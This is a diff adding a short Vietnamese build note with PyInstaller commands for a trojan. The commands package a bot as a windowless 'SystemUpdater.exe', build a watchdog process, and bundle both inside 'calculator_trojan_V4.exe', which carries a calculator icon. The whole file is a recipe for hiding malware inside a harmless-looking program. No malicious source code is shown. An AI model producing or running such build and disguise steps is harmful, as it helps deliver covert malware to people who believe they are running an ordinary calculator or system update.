@@ -1,0 +1,12 @@
+===================================ĐÓNG GÓI=============================================
+Thư viện cần cài đặt trước khi đóng gói "pip install cryptography"
+>>> Đóng gói bot_test_V4.py thành SystemUpdater.exe:
+pyinstaller --noconsole --onefile --icon=SystemUpdater.ico --hidden-import=psutil --hidden-import=cryptography bot_test_V4.py
+copy dist\bot_test_V4.exe SystemUpdater.exe
+
+>>> Đóng gói watchdog.py thành watchdog.exe:
+pyinstaller --noconsole --onefile --icon=watchdog.ico --hidden-import=psutil watchdog.py
+copy dist\watchdog.exe watchdog.exe
+
+>>> Đóng gói calculator_trojan_V4.py thành calculator_trojan_V4.exe:
+pyinstaller --noconsole --onefile --icon=calculator.ico --add-data "SystemUpdater.exe;." --add-data "watchdog.exe;." --hidden-import=psutil --hidden-import=tkinter --hidden-import=pywin32 calculator_trojan_V4.py
